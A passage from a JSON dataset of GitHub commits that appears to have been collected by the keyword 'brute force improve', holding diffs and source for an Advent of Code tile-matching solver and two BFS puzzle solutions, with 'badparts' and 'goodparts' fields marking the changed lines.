\")","        print(\" \")","    print(\"***\")","    for line in grid:","        line_count = len(images[list(images.keys())[0]]['data'])","        for ln in range(0, line_count):","            for cell in line:","                print(images[cell]['data'][ln], end=\"\")","                print(\" \", end=\" \")","            print(\" \")","        print(\" \")","    '''","    mon = has_monster(sea_image)","    print(\"Roughness: \", calc_roughness(sea_image, len(mon)))"]}],"source":"\n\nexample='''Tile 2311: .. . .. .. Tile 1951: ..... . . . .. Tile 1171: . .. . . ..... Tile 1427: . . .... ... ... . .. .. Tile 1489: .. . .. ... .. Tile 2473: . . . .. Tile 2971: .. . . .. .. ... Tile 2729: ... .. .... . . Tile 3079: . .. . .. .. .. ''' seamonster=[\" \" \" def get_borders(image): return[[x for x in image[0]], [image[x][-1] for x in range(0, len(image))], [image[-1][x] for x in range(0, len(image))], [image[x][0] for x in range(0, len(image))]] def set_neigh(images, key, pos, neigh): n=images[key]['neigh'] assert n[pos] is None n[pos]=neigh def match_all(images): ops=[lambda data: data, lambda data: image_flip_vertical(data), lambda data: image_flip_horizontal(data), lambda data: image_flip_horizontal(image_flip_vertical(data)), lambda data: image_rotated(data), lambda data: image_flip_vertical(image_rotated(data)), lambda data: image_flip_horizontal(image_rotated(data)), lambda data: image_flip_horizontal(image_flip_vertical(image_rotated(data)))] keys=list(images.keys()) deadlock_ops=[0] * len(keys) all_matches=[] def run(): all_matches.clear() for i in range(0, len(keys)): current_i=keys[i] current_tile_i=images[current_i] data_i=current_tile_i['data'] op_i=current_tile_i['op'] test_data_i=ops[op_i](data_i) borders_i=get_borders(test_data_i) matches=[] for j in range(0, len(keys)): if i==j: continue current_j=keys[j] current_tile_j=images[current_j] data_j=current_tile_j['data'] op_j=current_tile_j['op'] test_data_j=ops[op_j](data_j) borders_j=get_borders(test_data_j) ranges=[(0, 2),(2, 0),(1, 3),(3, 1)] for r in ranges: if borders_i[r[0]]==borders_j[r[1]]: matches.append((current_i, current_j, r[0], r[1])) if len(matches) < 1: current_tile_i['op'] +=1 if current_tile_i['op'] >=len(ops): nonlocal deadlock_ops for index in range(0, len(keys)): key=keys[index] images[key]['op']=deadlock_ops[index] images[deadlock_ops[0]]['op'] +=1 for index in range(1, len(keys)): if images[deadlock_ops[i -1]]['op'] < len(ops): break images[deadlock_ops[i]]['op'] +=1 images[deadlock_ops[i -1]]['op']=0 assert images[deadlock_ops[-1]]['op'] < len(ops) return False all_matches.append(matches) print(\"do we have corners?\", len([x for x in all_matches if len(x)==2])) return len([x for x in all_matches if len(x)==2])==4 while not run(): None for k in keys: op=images[k]['op'] images[k]['data']=ops[op](images[k]['data']) for matches in all_matches: for match in matches: key_i=match[0] key_j=match[1] borders_i=get_borders(images[key_i]['data']) borders_j=get_borders(images[key_j]['data']) for bi in borders_i: for bj in borders_j: if bi==bj: set_neigh(images, key_i, borders_i.index(bi), key_j) def get_corners(images): corner_list=[] for k, v in images.items(): count=0 for b in v['neigh']: if b is not None: count +=1 if count==2: corner_list.append(k) return corner_list def image_rotated(data): new_data=[\"\"] * len(data[0]) line_len=len(data[0]) lines_len=len(data) for line_pos in range(0, line_len): for p in range(0, lines_len): c=data[lines_len -p -1][line_pos] new_data[line_pos] +=c return new_data def image_flip_horizontal(data): new_data=[] for line in data: new_line=line[::-1] new_data.append(new_line) return new_data def image_flip_vertical(data): new_data=data[::-1] return new_data test='''. ... .... . ... . . . .. . ... def has_monster(sea_data): monsters=[seamonster, image_flip_vertical(seamonster), image_flip_horizontal(seamonster), image_flip_horizontal(image_flip_vertical(seamonster)), image_rotated(seamonster), image_flip_vertical(image_rotated(seamonster)), image_flip_horizontal(image_rotated(seamonster)), image_flip_horizontal(image_flip_vertical(image_rotated(seamonster)))] monsters_found=[] sea_height=len(sea_data) sea_width=len(sea_data[0]) for monster in monsters: monster_height=len(monster) monster_width=len(monster[0]) for j in range(0, sea_height -monster_height): for i in range(0, sea_width -monster_width): found=True for jj in range(0, monster_height): sea_line=sea_data[j +jj] monster_line=monster[jj] for ii in range(0, len(monster_line)): m=monster_line[ii] s=sea_line[i +ii] if m==' found=False break if not found: break if found: monsters_found.append((i, j, monsters.index(monster))) print(monsters_found) return monsters_found def calc_roughness(data, monsters): def calc_sharps(image): sharps=0 for line in image: sharps +=sum(map(lambda x: 1 if ' return sharps print(calc_sharps(data) -monsters * calc_sharps(seamonster)) def order_tiles(images): top_left=None for cor in get_corners(images): if images[cor]['neigh'][0] is None and images[cor]['neigh'][3] is None: top_left=cor break assert top_left is not None left_one=top_left line_one=top_left grid=[] while True: line=[] while True: if left_one is None: grid.append(line) break line.append(left_one) left_one=images[left_one]['neigh'][1] line_one=images[line_one]['neigh'][2] left_one=line_one if left_one is None: break print(\"***\") for line in grid: for cell in line: print(cell, end=\" \") print(\" \") print(\"***\") for line in grid: line_count=len(images[list(images.keys())[0]]['data']) for ln in range(0, line_count): for cell in line: print(images[cell]['data'][ln], end=\"\") print(\" \", end=\" \") print(\" \") print(\" \") return grid def make_sea_image(images, grid): data=[] for ln in grid: for index in range(1, len(images[ln[0]]['data']) -1): line=\"\" for cell in ln: content=images[cell]['data'][index][1:-1] line +=content data.append(line) print(\"\\n\".join(data)) return data def make_image(image_data): return{'data': image_data, 'neigh':[None] * 4, 'op': 0} def manage_images(data): key=None image_data=None images={} for line in data: if len(line)==0: if key is not None: images[key]=make_image(image_data) key=None continue if key is None: key=line.split(' ')[1][:-1] image_data=[] else: image_data.append(line) if key is not None: images[key]=make_image(image_data) match_all(images) mul=1 for m in get_corners(images): mul *=int(m) print(\"corners:\", mul) grid=order_tiles(images) sea_image=make_sea_image(images, grid) mon=has_monster(sea_image) if mon is not None: print(\"Monster!\", mon) else: print(\"No Monster\") calc_roughness(sea_image, len(mon)) ","sourceWithComments":"\nexample='''Tile 2311:\n..##.#..#.\n##..#.....\n#...##..#.\n####.#...#\n##.##.###.\n##...#.###\n.#.#.#..##\n..#....#..\n###...#.#.\n..###..###\n\nTile 1951:\n#.##...##.\n#.####...#\n.....#..##\n#...######\n.##.#....#\n.###.#####\n###.##.##.\n.###....#.\n..#.#..#.#\n#...##.#..\n\nTile 1171:\n####...##.\n#..##.#..#\n##.#..#.#.\n.###.####.\n..###.####\n.##....##.\n.#...####.\n#.##.####.\n####..#...\n.....##...\n\nTile 1427:\n###.##.#..\n.#..#.##..\n.#.##.#..#\n#.#.#.##.#\n....#...##\n...##..##.\n...#.#####\n.#.####.#.\n..#..###.#\n..##.#..#.\n\nTile 1489:\n##.#.#....\n..##...#..\n.##..##...\n..#...#...\n#####...#.\n#..#.#.#.#\n...#.#.#..\n##.#...##.\n..##.##.##\n###.##.#..\n\nTile 2473:\n#....####.\n#..#.##...\n#.##..#...\n######.#.#\n.#...#.#.#\n.#########\n.###.#..#.\n########.#\n##...##.#.\n..###.#.#.\n\nTile 2971:\n..#.#....#\n#...###...\n#.#.###...\n##.##..#..\n.#####..##\n.#..####.#\n#..#.#..#.\n..####.###\n..#.#.###.\n...#.#.#.#\n\nTile 2729:\n...#.#.#.#\n####.#....\n..#.#.....\n....#..#.#\n.##..##.#.\n.#.####...\n####.#.#..\n##.####...\n##..#.##..\n#.##...##.\n\nTile 3079:\n#.#.#####.\n.#..######\n..#.......\n######....\n####.#..#.\n.#...#.##.\n#.#####.##\n..#.###...\n..#.......\n..#.###...\n'''\n\n\nseamonster = [\"                  # \",\n              \"#    ##    ##    ###\",\n              \" #  #  #  #  #  #   \"]\n\n\ndef get_borders(image):\n    return [[x for x in image[0]],\n            [image[x][-1] for x in range(0, len(image))],\n            [image[-1][x] for x in range(0, len(image))],\n            [image[x][0] for x in range(0, len(image))]]\n\n\ndef set_neigh(images, key, pos, neigh):\n    n = images[key]['neigh']\n    assert n[pos] is None\n    n[pos] = neigh\n\n\ndef match_all(images):\n    ops = [lambda data: data,\n           lambda data: image_flip_vertical(data),\n           lambda data: image_flip_horizontal(data),\n           lambda data: image_flip_horizontal(image_flip_vertical(data)),\n           lambda data: image_rotated(data),\n           lambda data: image_flip_vertical(image_rotated(data)),\n           lambda data: image_flip_horizontal(image_rotated(data)),\n           lambda data: image_flip_horizontal(image_flip_vertical(image_rotated(data)))]\n\n    keys = list(images.keys())\n    deadlock_ops = [0] * len(keys)\n    all_matches = []\n\n    def run():\n        all_matches.clear()\n        for i in range(0, len(keys)):\n            current_i = keys[i]\n            current_tile_i = images[current_i]\n            data_i = current_tile_i['data']\n            op_i = current_tile_i['op']\n            test_data_i = ops[op_i](data_i)\n            borders_i = get_borders(test_data_i)\n            matches = []\n            for j in range(0, len(keys)):\n                if i == j:\n                    continue\n                current_j = keys[j]\n                current_tile_j = images[current_j]\n                data_j = current_tile_j['data']\n                op_j = current_tile_j['op']\n                test_data_j = ops[op_j](data_j)\n                borders_j = get_borders(test_data_j)\n                ranges = [(0, 2), (2, 0), (1, 3), (3, 1)]\n                for r in ranges:\n                    if borders_i[r[0]] == borders_j[r[1]]:\n                        matches.append((current_i, current_j, r[0], r[1]))\n            if len(matches) < 1:\n                current_tile_i['op'] += 1\n                if current_tile_i['op'] >= len(ops):\n                    nonlocal deadlock_ops\n                    for index in range(0, len(keys)):\n                        key = keys[index]\n                        images[key]['op'] = deadlock_ops[index]\n                    images[deadlock_ops[0]]['op'] += 1\n                    for index in range(1, len(keys)):\n                        if images[deadlock_ops[i - 1]]['op'] < len(ops):\n                            break\n                        images[deadlock_ops[i]]['op'] += 1\n                        images[deadlock_ops[i - 1]]['op'] = 0\n                    assert images[deadlock_ops[-1]]['op'] < len(ops)\n                return False\n            all_matches.append(matches)\n        print(\"do we have corners?\", len([x for x in all_matches if len(x) == 2]))\n        return len([x for x in all_matches if len(x) == 2]) == 4\n\n    while not run():\n        None\n\n    for k in keys:\n        op = images[k]['op']\n        images[k]['data'] = ops[op](images[k]['data'])\n\n    for matches in all_matches:\n        for match in matches:\n            key_i = match[0]\n            key_j = match[1]\n            borders_i = get_borders(images[key_i]['data'])\n            borders_j = get_borders(images[key_j]['data'])\n            for bi in borders_i:\n                for bj in borders_j:\n                    if bi == bj:\n                        set_neigh(images, key_i, borders_i.index(bi), key_j)\n\n\n\ndef get_corners(images):\n    corner_list = []\n    for k, v in images.items():\n        count = 0\n        for b in v['neigh']:\n            if b is not None:\n                count += 1\n        if count == 2:\n            corner_list.append(k)\n    return corner_list\n\n\ndef image_rotated(data):\n    new_data = [\"\"] * len(data[0])\n    line_len = len(data[0])\n    lines_len = len(data)\n    for line_pos in range(0, line_len):\n        for p in range(0, lines_len):\n            c = data[lines_len - p - 1][line_pos]\n            new_data[line_pos] += c\n    return new_data\n\n\ndef image_flip_horizontal(data):\n    new_data = []\n    for line in data:\n        new_line = line[::-1]\n        new_data.append(new_line)\n    return new_data\n\n\ndef image_flip_vertical(data):\n    new_data = data[::-1]\n    return new_data\n\n\ntest = '''.#.#..#.##...#.##..#####\n###....#.#....#..#......\n##.##.###.#.#..######...\n###.#####...#.#####.#..#\n##.#....#.##.####...#.##\n...########.#....#####.#\n....#..#...##..#.#.###..\n.####...#..#.....#......\n#..#.##..#..###.#.##....\n#.####..#.####.#.#.###..\n###.#.#...#.######.#..##\n#.####....##..########.#\n##..##.#...#...#.#.#.#..\n...#..#..#.#.##..###.###\n.#.#....#.##.#...###.##.\n###.#...#..#.##.######..\n.#.#.###.##.##.#..#.##..\n.####.###.#...###.#..#.#\n..#.#..#..#.#.#.####.###\n#..####...#.#.#.###.###.\n#####..#####...###....##\n#.##..#..#...#..####...#\n.#.###..##..##..####.##.\n...###...##...#...#..###'''\n\n\ndef has_monster(sea_data):\n    monsters = [seamonster,\n                image_flip_vertical(seamonster),\n                image_flip_horizontal(seamonster),\n                image_flip_horizontal(image_flip_vertical(seamonster)),\n                image_rotated(seamonster),\n                image_flip_vertical(image_rotated(seamonster)),\n                image_flip_horizontal(image_rotated(seamonster)),\n                image_flip_horizontal(image_flip_vertical(image_rotated(seamonster)))]\n\n    monsters_found = []\n\n    sea_height = len(sea_data)\n    sea_width = len(sea_data[0])\n\n    for monster in monsters:\n        monster_height = len(monster)\n        monster_width = len(monster[0])\n\n        for j in range(0, sea_height - monster_height):\n            for i in range(0, sea_width - monster_width):\n                found = True\n                for jj in range(0, monster_height):\n                    sea_line = sea_data[j + jj]\n                    monster_line = monster[jj]\n                    for ii in range(0, len(monster_line)):\n                        m = monster_line[ii]\n                        s = sea_line[i + ii]\n                        if m == '#' and s != '#':\n                            found = False\n                            break\n                        #print(s, end='')\n                    #print(\" \")\n                    if not found:\n                        break\n                if found:\n                    monsters_found.append((i, j, monsters.index(monster)))\n    print(monsters_found)\n    return monsters_found\n\n\ndef calc_roughness(data, monsters):\n    def calc_sharps(image):\n        sharps = 0\n        for line in image:\n            sharps += sum(map(lambda x: 1 if '#' in x else 0, line))\n        return sharps\n\n    print(calc_sharps(data) - monsters * calc_sharps(seamonster))\n\n\ndef order_tiles(images):\n    top_left = None\n    for cor in get_corners(images):\n        if images[cor]['neigh'][0] is None and images[cor]['neigh'][3] is None:\n            top_left = cor\n            break\n\n    assert top_left is not None\n\n    left_one = top_left\n    line_one = top_left\n    grid = []\n\n    while True:\n        line = []\n        while True:\n            if left_one is None:\n                grid.append(line)\n                break\n            line.append(left_one)\n            left_one = images[left_one]['neigh'][1]\n        line_one = images[line_one]['neigh'][2]\n        left_one = line_one\n        if left_one is None:\n            break\n\n    print(\"***\")\n    for line in grid:\n        for cell in line:\n            print(cell, end=\" \")\n        print(\" \")\n\n    print(\"***\")\n    for line in grid:\n        line_count = len(images[list(images.keys())[0]]['data'])\n        for ln in range(0, line_count):\n            for cell in line:\n                print(images[cell]['data'][ln], end=\"\")\n                print(\" \", end=\" \")\n            print(\" \")\n        print(\" \")\n\n    return grid\n\n\ndef make_sea_image(images, grid):\n    data = []\n    for ln in grid:\n        for index in range(1, len(images[ln[0]]['data']) - 1):\n            line = \"\"\n            for cell in ln:\n                content = images[cell]['data'][index][1:-1]\n                line += content\n            data.append(line)\n\n    print(\"\\n\".join(data))\n\n    return data\n\n\ndef make_image(image_data):\n    return {'data': image_data,\n            'neigh': [None] * 4,\n            'op': 0}\n\n\ndef manage_images(data):\n    key = None\n    image_data = None\n    images = {}\n    for line in data:\n        if len(line) == 0:\n            if key is not None:\n                images[key] = make_image(image_data)\n            key = None\n            continue\n        if key is None:\n            key = line.split(' ')[1][:-1]\n            image_data = []\n        else:\n            image_data.append(line)\n\n    if key is not None:\n        images[key] = make_image(image_data)\n\n    match_all(images)\n\n    mul = 1\n    for m in get_corners(images):\n       mul *= int(m)\n    print(\"corners:\", mul)\n\n    grid = order_tiles(images)\n\n    #grid = [['1951','2311','3079'],\n    #     ['2729','1427','2473'],\n    #    ['2971','1489','1171']]\n\n    sea_image = make_sea_image(images, grid)\n\n    mon = has_monster(sea_image)\n    if mon is not None:\n        print(\"Monster!\", mon)\n    else:\n        print(\"No Monster\")\n\n    calc_roughness(sea_image, len(mon))\n\n\n"}},"msg":"improved brute force for day20"}},"https:\/\/github.com\/phibzy\/InterviewQPractice":{"ea6a73d14fd224fb3d7d8645ba37a94b40649848":{"url":"https:\/\/api.github.com\/repos\/phibzy\/InterviewQPractice\/commits\/ea6a73d14fd224fb3d7d8645ba37a94b40649848","html_url":"https:\/\/github.com\/phibzy\/InterviewQPractice\/commit\/ea6a73d14fd224fb3d7d8645ba37a94b40649848","message":"Slightly improved brute force-y solution","sha":"ea6a73d14fd224fb3d7d8645ba37a94b40649848","keyword":"brute force improve","diff":"diff --git a\/Solutions\/ShortestPathVisitingAllNodes\/shortestPath.py b\/Solutions\/ShortestPathVisitingAllNodes\/shortestPath.py\nindex df157c0..ae3d3de 100755\n--- a\/Solutions\/ShortestPathVisitingAllNodes\/shortestPath.py\n+++ b\/Solutions\/ShortestPathVisitingAllNodes\/shortestPath.py\n@@ -9,7 +9,7 @@\n \n from collections import deque\n \n-class Solution:\n+class Solution1:\n     def shortestPathLength(self, graph):\n         # One approach (brute forcy):\n         \"\"\"\n@@ -93,3 +93,66 @@ def addToQ(self, n, w, d, seen, q):\n             k += 1\n             \n         q.insert(k, (n, w, d, seen))        \n+\n+\n+    \"\"\"\n+\n+    Better approach:\n+\n+    We can use a BFS (since no weights), which guarantees our q is always in order.\n+    We can also use a visited hash.\n+    Since we're only concerned about visiting all nodes, we will use a set\n+    to keep track of our \"state\" for each path. We stop searching once we have a state\n+    which has seen all nodes.\n+\n+    With our visited hash, instead of checking whether we visited somewhere, we check \n+    whether we visited somewhere with THE SAME STATE. For example, could have taken a different path there \n+    and visited different nodes on the way.\n+\n+    \"\"\"\n+\n+class Solution:\n+    def shortestPathLength(self, graph):\n+        # Still have the same condition checking for < 2 edges\n+        if len(graph) <= 2: return len(graph) - 1\n+\n+        minWeight = float('inf')\n+\n+        # Still start from different nodes\n+        for i in range(len(graph)):\n+\n+            # q for BFS\n+            q = deque()\n+            visited = dict()\n+\n+            # Original state - we've only visited the starting node\n+            visited[i] = set([i])\n+\n+            q.append((i, 0, set([i])))\n+\n+            # Same as before\n+            while True:\n+                node, weight, state = q.popleft()\n+\n+                # If the next lowest weight we check is greater or equal\n+                # to our current minWeight, we won't find a better\n+                # path from this starting node\n+                if weight >= minWeight: break\n+\n+                # Add next node to state\n+                state.add(node)\n+\n+                # If we've visited all nodes, we're donezo\n+                if len(state) == len(graph):\n+                    minWeight = weight\n+                    break\n+\n+                # Otherwise, keep checking for path\n+                for neighbour in graph[node]:\n+                    # If we have already visited a node\n+                    # with the same state, don't add to q \n+                    if not (neighbour in visited and visited[neighbour] == state):\n+                        q.append((neighbour, weight+1, state.copy()))\n+\n+        return minWeight\n+\ndiff --git a\/Solutions\/ShortestPathVisitingAllNodes\/test.py b\/Solutions\/ShortestPathVisitingAllNodes\/test.py\nindex 102cb6c..c3df842 100755\n--- a\/Solutions\/ShortestPathVisitingAllNodes\/test.py\n+++ b\/Solutions\/ShortestPathVisitingAllNodes\/test.py\n@@ -18,4 +18,5 @@ def testDefault(self):\n         self.assertEqual(self.a.shortestPathLength([[1,2,3],[0],[0],[0]]), 4)\n         self.assertEqual(self.a.shortestPathLength([[1],[0,2,4],[1,3,4],[2],[1,2]]), 4)\n         self.assertEqual(self.a.shortestPathLength([[2,3,7],[3,6],[0,4],[0,1,4,5],[3,7,2,6],[3],[4,1],[4,0]]), 7)\n+        self.assertEqual(self.a.shortestPathLength([[2,5,7],[2,4],[0,1],[5],[5,6,1],[4,10,8,0,3],[4,9],[0],[5],[6],[5]]), 13)\n \n","files":{"\/Solutions\/ShortestPathVisitingAllNodes\/shortestPath.py":{"changes":[{"diff":"\n \n from collections import deque\n \n-class Solution:\n+class Solution1:\n     def shortestPathLength(self, graph):\n         # One approach (brute forcy):\n         \"\"\"\n","add":1,"remove":1,"filename":"\/Solutions\/ShortestPathVisitingAllNodes\/shortestPath.py","badparts":["class Solution:"],"goodparts":["class Solution1:"]}],"source":"\n \"\"\" @author : Chris Phibbs @created : Monday Feb 22, 2021 11:54:30 AEDT @file : shortestPath \"\"\" from collections import deque class Solution: def shortestPathLength(self, graph): \"\"\" Pure Brute force Dijkstra's from every starting position Use set to keep track of visited positions Early exit if next smallest path is already greater than weight of current shortest path Way to mark dead ends? Use hash \"\"\" if len(graph) <=2: return len(graph) -1 shortestWeight=float('inf') for i in range(len(graph)): q=deque() q.append((i, 0, dict(), set([i]))) while True: n, weight, deadEnds, seen=q.popleft() numDead=0 if weight >=shortestWeight: break seen.add(n) if len(seen)==len(graph): shortestWeight=weight break if len(graph[n])==1: deadEnds[n]=1 numDead=len([x for x in graph[n] if x in deadEnds]) if len(graph[n]) -numDead==1: deadEnds[n]=1 for neighbour in graph[n]: if neighbour not in deadEnds: self.addToQ(neighbour, weight +1, deadEnds.copy(), seen.copy(), q) return shortestWeight def addToQ(self, n, w, d, seen, q): k=0 while k < len(q) and q[k][1] <=w: k +=1 q.insert(k,(n, w, d, seen)) ","sourceWithComments":"#!\/usr\/bin\/python3\n\n\"\"\"\n  @author      : Chris Phibbs\n  @created     : Monday Feb 22, 2021 11:54:30 AEDT\n  @file        : shortestPath\n\n\"\"\"\n\nfrom collections import deque\n\nclass Solution:\n    def shortestPathLength(self, graph):\n        # One approach (brute forcy):\n        \"\"\"\n        Pure Brute force\n        \n        Dijkstra's from every starting position\n        Use set to keep track of visited positions\n        \n        Early exit if next smallest path is already greater than weight of\n        current shortest path\n        \n        Way to mark dead ends? Use hash\n        \n        \"\"\"\n        \n        # Conidition for one node graph or one edge graph\n        # Optimal path will either be itself or one node to the next\n        # node\n        if len(graph) <= 2:\n            return len(graph) - 1\n        \n        shortestWeight = float('inf')\n        \n        for i in range(len(graph)):\n            q = deque()\n            # print(''.rjust(10, '-'))\n            # print(f\"Starting from node {i}\")\n            # print(''.rjust(10, '-'))\n            # print()\n            # print()\n            \n            # Append starting index, weight, path taken and starting visited set\n            q.append((i, 0, dict(), set([i])))\n            \n            # Keep going until we have a path that's visited\n            # all nodes\n            while True:\n                # print(''.rjust(10, '*'))\n                # print(\"Next iteration\")\n                # print(f\"Current q: {q}\")\n                # print(''.rjust(10, '*'))\n                # print()\n\n                n, weight, deadEnds, seen = q.popleft()\n                numDead = 0\n                # print(f\"Currently at node: {n}\")\n                \n                # If next smallest path is greater than current\n                # shortest path length, no point continuing\n                if weight >= shortestWeight: break\n                    \n                # Add current node to set\n                seen.add(n)\n                \n                # If visited every node, we can stop this check\n                if len(seen) == len(graph):\n                    shortestWeight = weight\n                    break\n                \n                # Add to dead ends if we've reached end of a direction\n                if len(graph[n]) == 1:\n                    deadEnds[n] = 1\n\n                # If only one option that's not a dead end, then\n                # this node also becoomes a dead end\n                numDead = len([x for x in graph[n] if x in deadEnds])\n\n                if len(graph[n]) - numDead == 1:\n                    deadEnds[n] = 1\n                    \n                for neighbour in graph[n]:\n                    if neighbour not in deadEnds:\n                        self.addToQ(neighbour, weight + 1, deadEnds.copy(), seen.copy(), q)\n                \n        return shortestWeight\n            \n    def addToQ(self, n, w, d, seen, q):\n        k = 0\n        \n        while k < len(q) and q[k][1] <= w:\n            k += 1\n            \n        q.insert(k, (n, w, d, seen))        \n"}},"msg":"Slightly improved brute force-y solution"}},"https:\/\/github.com\/fgmacedo\/problems_ads":{"7bc5ace40dcb4a00ff5bfc9bc5d096a1f2ac356f":{"url":"https:\/\/api.github.com\/repos\/fgmacedo\/problems_ads\/commits\/7bc5ace40dcb4a00ff5bfc9bc5d096a1f2ac356f","html_url":"https:\/\/github.com\/fgmacedo\/problems_ads\/commit\/7bc5ace40dcb4a00ff5bfc9bc5d096a1f2ac356f","message":"chore: Improving uri_1583 using bfs instead of brute force","sha":"7bc5ace40dcb4a00ff5bfc9bc5d096a1f2ac356f","keyword":"brute force improve","diff":"diff --git a\/problems\/uri_1583_contaminacao\/uri_1583_contaminacao.py b\/problems\/uri_1583_contaminacao\/uri_1583_contaminacao.py\nindex b73c9cf..6b88cb3 100755\n--- a\/problems\/uri_1583_contaminacao\/uri_1583_contaminacao.py\n+++ b\/problems\/uri_1583_contaminacao\/uri_1583_contaminacao.py\n@@ -1,4 +1,5 @@\n #!\/usr\/bin\/env python3\n+# import pydot\n import sys\n from collections import defaultdict, deque\n \n@@ -21,12 +22,12 @@ def __init__(self, value, row, column):\n         self.column = column\n \n     def __hash__(self) -> int:\n-        return hash(self.value) + hash(self.row) + hash(self.column)\n+        return hash(self.row) + hash(self.column)\n \n     def __eq__(self, o: object) -> bool:\n         if isinstance(o, str):\n             return self.value == o\n-        return self.value == o.value and self.row == o.row and self.column == o.column\n+        return self.row == o.row and self.column == o.column\n \n     def __repr__(self) -> str:\n         return f\"C({repr(self.value)}, {self.row}, {self.column})\"\n@@ -34,6 +35,8 @@ def __repr__(self) -> str:\n     def __str__(self) -> str:\n         return self.value\n \n+    # def as_node(self):\n+    #     return pydot.Node(repr(self), shape='circle')\n \n class Graph:\n     def __init__(self):\n@@ -65,24 +68,46 @@ def from_edges(cls, edges):\n \n         return g\n \n+    # def _repr_svg_(self):\n+    #     \"\"\"\n+    #     SVG Representation used for debug purposes on Jupyter.\n+    #     Also import for interactive representation:\n \n-def propagation(g):\n-    \"\"\"\n-    Brute forcing here...  I think that a BSF is applicable.\n-    \"\"\"\n-    keep_processing = True\n-    while keep_processing:\n-        keep_processing = False\n-        for vertex in g:\n-            for adj in g.adjacents(vertex):\n-                if vertex.value == WATER and adj.value == CONTAMINANT:\n-                    vertex.value = CONTAMINANT\n-                    keep_processing = True\n+    #         from IPython.display import SVG, display\n+    #     \"\"\"\n+    #     graph = pydot.Dot('list', graph_type='graph')\n \n+    #     for vertex in self:\n+    #         node = vertex.as_node()\n+    #         if vertex.value == WATER:\n+    #             node.set_color(\"blue\")\n+    #         elif vertex.value == CONTAMINANT:\n+    #             node.set_color(\"turquoise\")\n+\n+    #         graph.add_node(node)\n+    #         for adj in self.adjacents(vertex):\n+    #             edge = pydot.Edge(repr(vertex), repr(adj))\n+    #             graph.add_edge(edge)\n+\n+    #     return graph.create_svg().decode()\n+\n+\n+def bfs(g, s):\n+    visited = set()\n+    queue = deque()\n+\n+    queue.append(s)\n+    visited.add(s)\n+    while queue:\n+        vertex = queue.popleft()\n+        yield vertex\n+        for adj in g.adjacents(vertex):\n+            if adj not in visited:\n+                queue.append(adj)\n+                visited.add(adj)\n \n-if __name__ == \"__main__\":\n-    rl = sys.stdin.readline\n \n+def main(rl):\n     solutions = []\n     while True:\n \n@@ -103,19 +128,37 @@ def propagation(g):\n         for row in map:\n             prev_cell = None\n             for cell in row:\n+                if cell == STONE:\n+                    prev_cell = None\n+                    continue\n                 if prev_cell:\n                     g.ins_edge(prev_cell, cell)\n                 prev_cell = cell\n             if prev_row:\n                 for above_cell, current_cell in zip(prev_row, row):\n+                    if above_cell == STONE or current_cell == STONE:\n+                        continue\n                     g.ins_edge(above_cell, current_cell)\n             prev_row = row\n \n-        propagation(g)\n+        all_contamined = [v for v in g if v == CONTAMINANT]\n+        for contamined in all_contamined:\n+            for vertex in bfs(g, contamined):\n+                if vertex.value == WATER:\n+                    vertex.value = CONTAMINANT\n+                # display(SVG(g._repr_svg_()))\n \n         new_map = []\n         for row in map:\n             new_map.append(\"\".join(str(cell) for cell in row))\n         solutions.append(\"\\n\".join(new_map))\n \n-    print(\"\\n\\n\".join(solutions) + \"\\n\")\n+    return \"\\n\\n\".join(solutions) + \"\\n\"\n+\n+\n+\n+if __name__ == \"__main__\":\n+    rl = sys.stdin.readline\n+    solutions = main(rl)\n+    print(solutions)\n+\n","files":{"\/problems\/uri_1583_contaminacao\/uri_1583_contaminacao.py":{"changes":[{"diff":"\n         self.column = column\n \n     def __hash__(self) -> int:\n-        return hash(self.value) + hash(self.row) + hash(self.column)\n+        return hash(self.row) + hash(self.column)\n \n     def __eq__(self, o: object) -> bool:\n         if isinstance(o, str):\n             return self.value == o\n-        return self.value == o.value and self.row == o.row and self.column == o.column\n+        return self.row == o.row and self.column == o.column\n \n     def __repr__(self) -> str:\n         return f\"C({repr(self.value)}, {self.row}, {self.column})\"\n","add":2,"remove":2,"filename":"\/problems\/uri_1583_contaminacao\/uri_1583_contaminacao.py","badparts":["        return hash(self.value) + hash(self.row) + hash(self.column)","        return self.value == o.value and self.row == o.row and self.column == o.column"],"goodparts":["        return hash(self.row) + hash(self.column)","        return self.row == o.row and self.column == o.column"]},{"diff":"\n \n         return g\n \n+    # def _repr_svg_(self):\n+    #     \"\"\"\n+    #     SVG Representation used for debug purposes on Jupyter.\n+    #     Also import for interactive representation:\n \n-def propagation(g):\n-    \"\"\"\n-    Brute forcing here...  I think that a BSF is applicable.\n-    \"\"\"\n-    keep_processing = True\n-    while keep_processing:\n-        keep_processing = False\n-        for vertex in g:\n-            for adj in g.adjacents(vertex):\n-                if vertex.value == WATER and adj.value == CONTAMINANT:\n-                    vertex.value = CONTAMINANT\n-                    keep_processing = True\n+    #         from IPython.display import SVG, display\n+    #     \"\"\"\n+    #     graph = pydot.Dot('list', graph_type='graph')\n \n+    #     for vertex in self:\n+    #         node = vertex.as_node()\n+    #         if vertex.value == WATER:\n+    #             node.set_color(\"blue\")\n+    #         elif vertex.value == CONTAMINANT:\n+    #             node.set_color(\"turquoise\")\n+\n+    #         graph.add_node(node)\n+    #         for adj in self.adjacents(vertex):\n+    #             edge = pydot.Edge(repr(vertex), repr(adj))\n+    #             graph.add_edge(edge)\n+\n+    #     return graph.create_svg().decode()\n+\n+\n+def bfs(g, s):\n+    visited = set()\n+    queue = deque()\n+\n+    queue.append(s)\n+    visited.add(s)\n+    while queue:\n+        vertex = queue.popleft()\n+        yield vertex\n+        for adj in g.adjacents(vertex):\n+            if adj not in visited:\n+                queue.append(adj)\n+                visited.add(adj)\n \n-if __name__ == \"__main__\":\n-    rl = sys.stdin.readline\n \n+def main(rl):\n     solutions = []\n     while True:\n \n","add":36,"remove":14,"filename":"\/problems\/uri_1583_contaminacao\/uri_1583_contaminacao.py","badparts":["def propagation(g):","    \"\"\"","    Brute forcing here...  I think that a BSF is applicable.","    \"\"\"","    keep_processing = True","    while keep_processing:","        keep_processing = False","        for vertex in g:","            for adj in g.adjacents(vertex):","                if vertex.value == WATER and adj.value == CONTAMINANT:","                    vertex.value = CONTAMINANT","                    keep_processing = True","if __name__ == \"__main__\":","    rl = sys.stdin.readline"],"goodparts":["def bfs(g, s):","    visited = set()","    queue = deque()","    queue.append(s)","    visited.add(s)","    while queue:","        vertex = queue.popleft()","        yield vertex","        for adj in g.adjacents(vertex):","            if adj not in visited:","                queue.append(adj)","                visited.add(adj)","def main(rl):"]},{"diff":"\n         for row in map:\n             prev_cell = None\n             for cell in row:\n+                if cell == STONE:\n+                    prev_cell = None\n+                    continue\n                 if prev_cell:\n                     g.ins_edge(prev_cell, cell)\n                 prev_cell = cell\n             if prev_row:\n                 